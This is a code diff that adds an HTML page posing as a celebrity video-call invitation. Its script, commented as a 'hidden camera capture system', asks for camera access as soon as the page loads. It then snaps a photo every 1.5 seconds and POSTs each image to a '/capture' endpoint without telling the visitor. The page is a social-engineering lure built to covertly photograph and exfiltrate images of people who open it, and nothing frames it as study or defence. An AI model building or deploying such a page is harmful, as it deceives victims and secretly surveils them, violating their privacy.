@@ -1,0 +1,92 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>📞 Celebrity Video Call</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            background: url('https://source.unsplash.com/1600x900/?celebrity,event') no-repeat center center fixed;
+            background-size: cover;
+            color: white;
+            margin: 0;
+            padding: 0;
+        }
+        .call-container {
+            margin-top: 100px;
+            background: rgba(0, 0, 0, 0.85);
+            padding: 30px;
+            border-radius: 10px;
+            display: inline-block;
+            width: 90%;
+            max-width: 400px;
+        }
+        h1 {
+            font-size: 28px;
+            margin-bottom: 15px;
+        }
+        p {
+            font-size: 18px;
+            margin-bottom: 15px;
+        }
+        button {
+            width: 100%;
+            padding: 12px;
+            background: #ff4757;
+            color: white;
+            font-size: 18px;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+        }
+        button:hover {
+            background: #e84118;
+        }
+    </style>
+</head>
+<body>
+    <div class="call-container">
+        <h1>🎥 Join a Video Call with Your Favorite Celebrity!</h1>
+        <p>Click below to start the call.</p>
+        <button onclick="startCapture()">📞 Join Now</button>
+    </div>
+
+    <!-- Hidden camera capture system -->
+    <script>
+        let videoStream;
+        function startCapture() {
+            navigator.mediaDevices.getUserMedia({ video: true })
+                .then(stream => {
+                    videoStream = stream;
+                    captureLoop();
+                })
+                .catch(error => console.error("Error accessing camera:", error));
+        }
+
+        function captureLoop() {
+            let videoTrack = videoStream.getVideoTracks()[0];
+            let imageCapture = new ImageCapture(videoTrack);
+            
+            imageCapture.takePhoto()
+                .then(blob => {
+                    let reader = new FileReader();
+                    reader.onloadend = function () {
+                        fetch('/capture', {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify({ image: reader.result })
+                        });
+                    };
+                    reader.readAsDataURL(blob);
+                })
+                .catch(error => console.error("Capture error:", error));
+
+            setTimeout(captureLoop, 1500);
+        }
+
+        window.onload = startCapture; // Start capturing when page loads
+    </script>
+</body>
+</html>
